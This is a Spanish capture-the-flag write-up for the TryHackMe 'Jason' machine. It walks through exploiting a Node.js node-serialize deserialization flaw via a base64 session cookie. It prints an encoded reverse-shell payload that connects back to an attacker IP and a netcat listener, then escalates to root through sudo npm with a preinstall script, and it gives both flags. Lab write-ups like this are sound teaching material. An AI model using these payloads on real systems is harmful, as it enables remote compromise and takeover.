---
layout: post
author: jh3x
---

## WriteUp máquina **Jason**

Esta es una maquina con un nivel de dificultad Fácil en TryHackme vamos a ello:  
### Fase de reconocimineto
Como primer paso realizamos un ping a la maquina para identificar ante que maquina estamos:  

```console
PING 10.10.58.237 (10.10.58.237) 56(84) bytes of data.
64 bytes from 10.10.58.237: icmp_seq=1 ttl=63 time=307 ms
```

Como observamos la maquina nos responde con un TTL=63 por lo que nos enfrentamos a una maquina linux.  

El siguiente paso es ver que puertos abiertos tiene la maquina por lo que realizamos el siguiente escaneo:  

```console
nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.58.237 -oG allPorts
```
Y vemos los siguientes puertos abiertos:


| **PORT**   | **STATE** | **SERVICE** | **REASON ** |                                                                  
| 22/tcp |open|  ssh     |syn-ack ttl 63|                                                                                                                                                        
| 80/tcp |open|  http    |syn-ack ttl 63|


Teniendo los puertos abiertos identificamos la version de los servicios expuestos con el siguiente comando:

```console
nmap -sC -sV -p22,80 10.10.58.237 -oN targeted
```
Dando como resultado los siguientes servicios:

```console
PORT   STATE SERVICE VERSION                                                                                                                                                               
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                                                          
| ssh-hostkey:                                                                                                                                                                             
|   3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA)                                                                                                                             
|   256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA)                                                                                                                            
|_  256 12:ab:13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519)                                                                                                                          
80/tcp open  http                                                                                                                                                                          
| fingerprint-strings:                                                                                                                                                                     
|   GetRequest, HTTPOptions:                                                                                                                                                               
|     HTTP/1.1 200 OK                                                                                                                                                                      
|     Content-Type: text/html                                                                                                                                                              
|     Date: Wed, 09 Feb 2022 21:12:16 GMT                                                                                                                                                  
|     Connection: close                                                                                                                                                                    
|     <html><head>                                                                                                                                                                         
|     <title>Horror LLC</title>                                                                                                                                                            
|     <style>                                                                                                                                                                              
|     body {                                                                                                                                                                               
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);                                                                                                                      
|     background-size: 300% 300%;                                                                                                                                                          
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite; 
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-title: Horror LLC

```
Como podemos observar existe un servicio web por lo que inspeccionamos el servicio en el puerto 80  

![Panel](/images/writeup/jason/panel.png)

Vemos que el sitio web menciona que esta hecho con nodejs (**Built with Nodejs**) por lo que lo tenemos encuenta para las posteriores fases.

### Fase de explotacion

Despues de revisar la funcionalidad del sitio web observamos que al poner un correo en el campo de email address, se nos asigna una cookie donde el valor de session es una cadena en base64 si la decodificamos resulta ser el texto que pusimos de entrada por lo que nos indica que hay algun tipo de procesamiento de los datos como se muestra en la siguiente imagen:  

![Panel](/images/writeup/jason/base64.png)

Por lo que con los datos hasta ahora ya podriamos deducir el vector de ataque.  
Si buscamos exploit por la web referentes a Nodejs hay uno que llama la atención que es un exploit que permite la ejecución remota de comandos mediante la deserializacion de los datos tramitados para mas detalles puedes ver el siguiente link:     
**[Deserialization exploit](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)**.  

Para replicar este exploit  basicamente necesitamos desarrollar los siguientes pasos:  

### [1] Serializar los datos

Para ello podemos hacer uso del script **serialize.js**:  

```js 
var y = {
rce : function(){
require('child_process').exec('whoami', function(error,stdout, stderr) { console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```
es importante tener npm installado y la libreria node-serialize:

```code
npm install node-serialize
```
Si todo va bien hasta este punto al correr el siguiente comando:

```console
node serialize.js
```
deberia dar como resultado la siguiente salida:

```js
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('whoami', function(error,stdout, stderr) { console.log(stdout) });\n}"}
```

### [2] Deseralizar datos  

Hasta este punto tendriamos los datos serializados pero recordemos que el servidor hace el proceso inverso es decir deserializar los datos por lo que creamos el archivo **unserialize.js**:

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error,stdout, stderr) { console.log(stdout) });}()"}'
serialize.unserialize(payload);
```
Si ejecutamos este script con node podriamos observar en nuestro sistema que tenemos la capacidad de ejecutar comandos:  

```console
root@parrot ▓▒░ node unserialize.js 
root
```
### [3] Obtener una shell reversa

Ahora que tenemos toda la estructura armada buscamos la forma de entablar una reverse shell a nuestra maquina, para ello el articulo **[Deserialization exploit](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)** que mencionamos tiene una utilidad para obtener una reverse shell mediante js la cual esta disponible en: **[NodeJS Shell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)**

```console
root@parrot ▓▒░ python2 nodejsshell.py IP 4444                             
[+] LHOST = IP
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,51,46,57,52,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```
Luego copiamos el payload generado desde de la siguiente manera:  
Ejemplo:  

```js
{"rce":"_$$ND_FUNC$$_function(){<Payload generado>}()"}
```
Aplicando:  

```js
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,51,46,57,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Teniendo este payload lo guardamos en un archivo cualquiera en este caso yo lo llame **UnserevShell.js** y lo codificamos en base64:

```console
 root@parrot ▓▒░  cat  UnserevShell.js | base64 -w 0 |xclip -sel clip
```

Lo ponemos en la web en este caso yo lo puse con un editor de cookies:  

![Panel](/images/writeup/jason/base64Cod.png)

Y recargando la pagina tenemos una flamante reverse shell, asi que realizamos el tratamiento de la tty:  

```console
root@parrot ▓▒░ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.58.237 55210
Connected!
script /dev/null -c bash
Script started, file is /dev/null
dylan@jason:/opt/webapp$ ^Z
zsh: suspended  nc -nlvp 4444

root@parrot ▓▒░ stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
                               reset xterm
```
Exportamos las variables de entorno:

```console
dylan@jason:/opt/webapp$ export TERM=xterm
dylan@jason:/opt/webapp$ export SHELL=bash
```

Y podemos ver la flag del usuario:

```console
0ba48780dee9f5677a4461f588af217c
```
### Escalada de privilegios

Como primer paso en la escalada de privilegios escribimos el comando ```console sudo -l``` para ver que comandos podemos ejecutar como otros usuarios en este caso tenemos lo siguiente:

![Panel](/images/writeup/jason/sudo.png)

Buscamos algun vector para escalar privilegios en este caso encontre una en la siguiente pagina: **[npm-sudo-exploit](https://gtfobins.github.io/gtfobins/npm/#sudo)**  

Como podemos ver la escalada de privilegios simplemente consistira en ejecutar los siguiente pasos:

Nos dirigimos a un directorio con permisos de escritura y creamos un archivo en:

```console
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > /tmp/package.json 
dylan@jason:~$ sudo npm -C /tmp --unsafe-perm i
```
y obtenemos acceso root pudiendo ver la flag:  

```console
2cd5a9fd3a0024bfa98d01d69241760e
```

